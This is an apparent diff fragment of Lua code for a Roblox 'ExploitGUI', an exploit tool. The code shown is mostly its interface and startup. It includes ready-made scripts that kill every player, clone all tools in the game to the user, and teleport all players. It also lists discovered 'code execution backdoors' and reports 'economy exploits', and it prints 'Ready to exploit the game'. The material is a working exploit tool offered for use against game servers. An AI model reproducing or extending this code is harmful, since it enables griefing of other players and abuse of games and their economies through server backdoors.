+            ResultFrame.Size = UDim2.new(0.8, 0, 0.6, 0)
+            ResultFrame.Position = UDim2.new(0.1, 0, 0.2, 0)
+            ResultFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            ResultFrame.BorderSizePixel = 0
+            ResultFrame.ZIndex = 10
+            ResultFrame.Parent = self.ScreenGui
+
+            local ResultCorner = Instance.new("UICorner")
+            ResultCorner.CornerRadius = UDim.new(0, 15)
+            ResultCorner.Parent = ResultFrame
+
+            local ResultTitle = Instance.new("TextLabel")
+            ResultTitle.Name = "ResultTitle"
+            ResultTitle.Size = UDim2.new(1, 0, 0, 50)
+            ResultTitle.Position = UDim2.new(0, 0, 0, 0)
+            ResultTitle.BackgroundTransparency = 1
+            ResultTitle.Text = "Execution Result"
+            ResultTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+            ResultTitle.TextSize = 24
+            ResultTitle.Font = Enum.Font.SourceSansBold
+            ResultTitle.ZIndex = 11
+            ResultTitle.Parent = ResultFrame
+
+            local ResultText = Instance.new("TextLabel")
+            ResultText.Name = "ResultText"
+            ResultText.Size = UDim2.new(0.9, 0, 0.7, 0)
+            ResultText.Position = UDim2.new(0.05, 0, 0.2, 0)
+            ResultText.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            ResultText.BorderSizePixel = 0
+            ResultText.Text = tostring(result)
+            ResultText.TextColor3 = Color3.fromRGB(255, 255, 255)
+            ResultText.TextSize = 16
+            ResultText.Font = Enum.Font.SourceSans
+            ResultText.TextXAlignment = Enum.TextXAlignment.Left
+            ResultText.TextYAlignment = Enum.TextYAlignment.Top
+            ResultText.TextWrapped = true
+            ResultText.ZIndex = 11
+            ResultText.Parent = ResultFrame
+
+            local ResultTextPadding = Instance.new("UIPadding")
+            ResultTextPadding.PaddingTop = UDim.new(0, 10)
+            ResultTextPadding.PaddingBottom = UDim.new(0, 10)
+            ResultTextPadding.PaddingLeft = UDim.new(0, 10)
+            ResultTextPadding.PaddingRight = UDim.new(0, 10)
+            ResultTextPadding.Parent = ResultText
+
+            local ResultTextCorner = Instance.new("UICorner")
+            ResultTextCorner.CornerRadius = UDim.new(0, 8)
+            ResultTextCorner.Parent = ResultText
+
+            local CloseResultButton = Instance.new("TextButton")
+            CloseResultButton.Name = "CloseResultButton"
+            CloseResultButton.Size = UDim2.new(0, 40, 0, 40)
+            CloseResultButton.Position = UDim2.new(1, -50, 0, 10)
+            CloseResultButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+            CloseResultButton.BorderSizePixel = 0
+            CloseResultButton.Text = "✕"
+            CloseResultButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+            CloseResultButton.TextSize = 24
+            CloseResultButton.Font = Enum.Font.SourceSansBold
+            CloseResultButton.ZIndex = 11
+            CloseResultButton.Parent = ResultFrame
+
+            local CloseResultCorner = Instance.new("UICorner")
+            CloseResultCorner.CornerRadius = UDim.new(0, 20)
+            CloseResultCorner.Parent = CloseResultButton
+
+            CloseResultButton.MouseButton1Click:Connect(function()
+                ResultFrame:Destroy()
+            end)
+        end
+    end)
+
+    -- Common Scripts Card
+    local ScriptsCard = self:CreateCard("Common Scripts", "Execute frequently used scripts")
+    ScriptsCard.LayoutOrder = 1
+
+    local commonScripts = {
+        {name = "Kill All", code = [[
+            for _, player in pairs(game.Players:GetPlayers()) do
+                if player.Character and player.Character:FindFirstChild("Humanoid") then
+                    player.Character.Humanoid.Health = 0
+                end
+            end
+
+            return "Killed all players"
+        ]]},
+        {name = "Get All Tools", code = [[
+            local tools = {}
+            for _, v in pairs(game:GetDescendants()) do
+                if v:IsA("Tool") then
+                    table.insert(tools, v:Clone())
+                end
+            end
+
+            for _, tool in ipairs(tools) do
+                tool.Parent = game.Players.LocalPlayer.Backpack
+            end
+
+            return "Got " .. #tools .. " tools"
+        ]]},
+        {name = "Teleport All", code = [[
+            local targetPlayer = game.Players.LocalPlayer
+            for _, player in pairs(game.Players:GetPlayers()) do
+                if player.Character and targetPlayer.Character then
+                    player.Character:SetPrimaryPartCFrame(targetPlayer.Character.PrimaryPart.CFrame)
+                end
+            end
+
+            return "Teleported all players to you"
+        ]]}
+    }
+
+    local buttonY = 70
+
+    for _, script in ipairs(commonScripts) do
+        local ScriptButton = self:CreateButton(ScriptsCard, script.name, Color3.fromRGB(138, 43, 226))
+        ScriptButton.Position = UDim2.new(0, 20, 0, buttonY)
+
+        ScriptButton.MouseButton1Click:Connect(function()
+            local success, result = self.Engine:ExecuteCode(script.code)
+
+            local statusLabel = ScriptsCard:FindFirstChild("StatusLabel")
+            if not statusLabel then
+                statusLabel = self:CreateStatusLabel(ScriptsCard, UDim2.new(0, 20, 0, buttonY + 40))
+            end
+
+            statusLabel.Text = success and script.name .. " executed successfully! " .. tostring(result) or "Failed: " .. tostring(result)
+            statusLabel.TextColor3 = success and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(220, 20, 60)
+        end)
+
+        buttonY = buttonY + 40
+    end
+
+    -- Available Backdoors Card
+    local BackdoorsCard = self:CreateCard("Available Code Execution Backdoors", "List of backdoors that can execute code")
+    BackdoorsCard.LayoutOrder = 2
+
+    local codeBackdoors = {}
+    for _, backdoor in ipairs(self.Engine.Backdoors) do
+        if backdoor.name:lower():find("execute") or backdoor.name:lower():find("script") or backdoor.name:lower():find("eval") or backdoor.name:lower():find("command") then
+            table.insert(codeBackdoors, backdoor)
+        end
+    end
+
+    BackdoorsCard.Size = UDim2.new(1, -40, 0, 100 + math.min(#codeBackdoors, 5) * 30)
+
+    local backdoorY = 100
+    for i, backdoor in ipairs(codeBackdoors) do
+        if i <= 5 then -- Limit to 5 backdoors to avoid making the card too large
+            local BackdoorLabel = Instance.new("TextLabel")
+            BackdoorLabel.Name = "Backdoor" .. i
+            BackdoorLabel.Size = UDim2.new(1, -40, 0, 20)
+            BackdoorLabel.Position = UDim2.new(0, 20, 0, backdoorY)
+            BackdoorLabel.BackgroundTransparency = 1
+            BackdoorLabel.Text = backdoor.name .. " (" .. backdoor.path .. ")"
+            BackdoorLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            BackdoorLabel.TextSize = 14
+            BackdoorLabel.Font = Enum.Font.SourceSans
+            BackdoorLabel.TextXAlignment = Enum.TextXAlignment.Left
+            BackdoorLabel.Parent = BackdoorsCard
+
+            backdoorY = backdoorY + 30
+        end
+    end
+
+    if #codeBackdoors == 0 then
+        local NoBackdoorsLabel = Instance.new("TextLabel")
+        NoBackdoorsLabel.Name = "NoBackdoorsLabel"
+        NoBackdoorsLabel.Size = UDim2.new(1, -40, 0, 20)
+        NoBackdoorsLabel.Position = UDim2.new(0, 20, 0, 100)
+        NoBackdoorsLabel.BackgroundTransparency = 1
+        NoBackdoorsLabel.Text = "No code execution backdoors found in the game"
+        NoBackdoorsLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        NoBackdoorsLabel.TextSize = 14
+        NoBackdoorsLabel.Font = Enum.Font.SourceSans
+        NoBackdoorsLabel.TextXAlignment = Enum.TextXAlignment.Left
+        NoBackdoorsLabel.Parent = BackdoorsCard
+    end
+end
+
+-- Helper functions for creating UI elements
+function ExploitGUI:CreateCard(title, description)
+    local Card = Instance.new("Frame")
+    Card.Name = "Card"
+    Card.Size = UDim2.new(1, -40, 0, 280)
+    Card.Position = UDim2.new(0, 20, 0, 0) -- Position will be handled by UIListLayout
+    Card.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    Card.BorderSizePixel = 0
+    Card.ZIndex = 5
+    Card.Parent = self.ContentFrame
+
+    local CardCorner = Instance.new("UICorner")
+    CardCorner.CornerRadius = UDim.new(0, 12)
+    CardCorner.Parent = Card
+
+    -- Add a border to make it more visible
+    local Border = Instance.new("UIStroke")
+    Border.Color = Color3.fromRGB(60, 60, 60)
+    Border.Thickness = 2
+    Border.Parent = Card
+
+    local Title = Instance.new("TextLabel")
+    Title.Name = "Title"
+    Title.Size = UDim2.new(1, -40, 0, 30)
+    Title.Position = UDim2.new(0, 20, 0, 20)
+    Title.BackgroundTransparency = 1
+    Title.Text = title
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 22
+    Title.Font = Enum.Font.SourceSansBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.ZIndex = 6
+    Title.Parent = Card
+
+    local Description = Instance.new("TextLabel")
+    Description.Name = "Description"
+    Description.Size = UDim2.new(1, -40, 0, 30)
+    Description.Position = UDim2.new(0, 20, 0, 50)
+    Description.BackgroundTransparency = 1
+    Description.Text = description
+    Description.TextColor3 = Color3.fromRGB(200, 200, 200)
+    Description.TextSize = 16
+    Description.Font = Enum.Font.SourceSans
+    Description.TextXAlignment = Enum.TextXAlignment.Left
+    Description.TextWrapped = true
+    Description.ZIndex = 6
+    Description.Parent = Card
+
+    return Card
+end
+
+function ExploitGUI:CreateTextInput(parent, placeholder)
+    local Input = Instance.new("TextBox")
+    Input.Name = "Input"
+    Input.Size = UDim2.new(0.8, 0, 0, 40)
+    Input.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    Input.BorderSizePixel = 0
+    Input.Text = ""
+    Input.PlaceholderText = placeholder
+    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Input.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    Input.TextSize = 16
+    Input.Font = Enum.Font.SourceSans
+    Input.TextXAlignment = Enum.TextXAlignment.Left
+    Input.Parent = parent
+
+    local InputPadding = Instance.new("UIPadding")
+    InputPadding.PaddingLeft = UDim.new(0, 10)
+    InputPadding.Parent = Input
+
+    local InputCorner = Instance.new("UICorner")
+    InputCorner.CornerRadius = UDim.new(0, 8)
+    InputCorner.Parent = Input
+
+    return Input
+end
+
+function ExploitGUI:CreateButton(parent, text, color)
+    local Button = Instance.new("TextButton")
+    Button.Name = "Button"
+    Button.Size = UDim2.new(0, 120, 0, 40)
+    Button.BackgroundColor3 = color or Color3.fromRGB(220, 20, 60)
+    Button.BorderSizePixel = 0
+    Button.Text = text
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.TextSize = 16
+    Button.Font = Enum.Font.SourceSansBold
+    Button.Parent = parent
+
+    local ButtonCorner = Instance.new("UICorner")
+    ButtonCorner.CornerRadius = UDim.new(0, 8)
+    ButtonCorner.Parent = Button
+
+    return Button
+end
+
+function ExploitGUI:CreateStatusLabel(parent)
+    local StatusLabel = Instance.new("TextLabel")
+    StatusLabel.Name = "StatusLabel"
+    StatusLabel.Size = UDim2.new(0, 200, 0, 20)
+    StatusLabel.Position = UDim2.new(1, -220, 0, 150)
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.Text = "Ready"
+    StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    StatusLabel.TextSize = 16
+    StatusLabel.Font = Enum.Font.SourceSansBold
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Right
+    StatusLabel.Parent = parent
+
+    return StatusLabel
+end
+
+function ExploitGUI:ShowNotification(title, message)
+    local Notification = Instance.new("Frame")
+    Notification.Name = "Notification"
+    Notification.Size = UDim2.new(0, 300, 0, 100)
+    Notification.Position = UDim2.new(0.5, -150, 0, -110)
+    Notification.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Notification.BorderSizePixel = 0
+    Notification.ZIndex = 100
+    Notification.Parent = self.ScreenGui
+
+    local NotifCorner = Instance.new("UICorner")
+    NotifCorner.CornerRadius = UDim.new(0, 10)
+    NotifCorner.Parent = Notification
+
+    local NotifText = Instance.new("TextLabel")
+    NotifText.Size = UDim2.new(1, 0, 1, 0)
+    NotifText.BackgroundTransparency = 1
+    NotifText.Text = title .. "\n" .. message
+    NotifText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    NotifText.TextSize = 18
+    NotifText.Font = Enum.Font.SourceSansBold
+    NotifText.ZIndex = 101
+    NotifText.Parent = Notification
+
+    -- Animate the notification
+    local showTween = TweenService:Create(Notification, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, -150, 0, 20)
+    })
+    showTween:Play()
+
+    wait(3)
+
+    local hideTween = TweenService:Create(Notification, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.5, -150, 0, -110)
+    })
+    hideTween:Play()
+
+    hideTween.Completed:Connect(function()
+        Notification:Destroy()
+    end)
+end
+
+-- Initialize and run the exploit GUI
+local engine = ExploitEngine:Initialize()
+local gui = ExploitGUI:Create(engine)
+
+-- Make the GUI visible immediately
+gui:ToggleMainInterface(true)
+
+-- Create a notification to confirm the GUI is loaded
+gui:ShowNotification("⚡ EXPLOIT GUI LOADED", "Found " .. #engine.Backdoors .. " backdoors, " ..
+                     #engine.RemoteEvents .. " remote events, " ..
+                     #engine.RemoteFunctions .. " remote functions, and " ..
+                     #engine.EconomyExploits .. " economy exploits")
+
+print("⚡ EXPLOIT GUI LOADED")
+print("🎯 Ready to exploit the game")
+print("📱 Mobile-optimized interface active")
+print("🚨 Use responsibly!")
